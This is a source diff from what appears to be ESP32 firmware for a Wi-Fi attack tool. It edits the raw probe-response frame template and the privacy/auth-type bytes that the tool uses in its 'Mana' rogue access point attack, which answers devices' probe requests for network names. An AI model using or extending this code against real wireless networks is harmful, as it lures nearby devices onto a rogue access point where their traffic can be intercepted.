@@ -27,7 +27,7 @@ uint8_t probe_response_raw[] = {
 0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // BSSID
 0xc0, 0x72,                         // Fragment number 0 seq number 1836
 0xa3, 0x52, 0x5b, 0x8d, 0xd2, 0x00, 0x00, 0x00, 0x64, 0x00,
-0x11, 0x11, // 802.11 Privacy Capability, 0x1101 == open auth. 0x11 0x01 or 0x01 0x11?
+0x11, 0x11, // 802.11 Privacy Capability, 0x1101 == no. 0x11 0x11 == yes
             /* Otherwise AND existing bytes with 0b11101111 */
 0x00, 0x08, // Parameter Set (0), SSID Length (8)
             // To fill: SSID
@@ -654,15 +654,15 @@ esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, e
     uint8_t *bAuthType = NULL;
     switch (authType) {
     case AUTH_TYPE_NONE:
-        bAuthType = AUTH_TYPE_NONE_BYTES;
+        bAuthType = PRIVACY_OFF_BYTES;
         probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x00;
         break;
     case AUTH_TYPE_WEP:
-        bAuthType = AUTH_TYPE_WEP_BYTES;
+        bAuthType = PRIVACY_ON_BYTES;
         probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x01;
         break;
     case AUTH_TYPE_WPA:
-        bAuthType = AUTH_TYPE_WPA_BYTES;
+        bAuthType = PRIVACY_ON_BYTES;
         probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x02;
         break;
     default:
@@ -726,11 +726,11 @@ void wifi_pkt_rcvd(void *buf, wifi_promiscuous_pkt_type_t type) {
         strncpy(ssid, (char *)&payload[PROBE_SSID_OFFSET], ssid_len);
         ssid[ssid_len] = '\0';
         
-        if (attack_status[ATTACK_SNIFF] || attack_status[ATTACK_MANA_VERBOSE]) {
+        #ifdef DEBUG_VERBOSE
             char srcMac[18];
             esp_err_t err = mac_bytes_to_string(&payload[PROBE_SRCADDR_OFFSET], srcMac);
             ESP_LOGI(TAG, "Probe for \"%s\" from %s", ssid, srcMac);
-        }
+        #endif
         if (attack_status[ATTACK_MANA]) {
             /* Mana enabled - Send a probe response
                Get current MAC - NOTE: MAC hopping during the Mana attack will render the attack useless
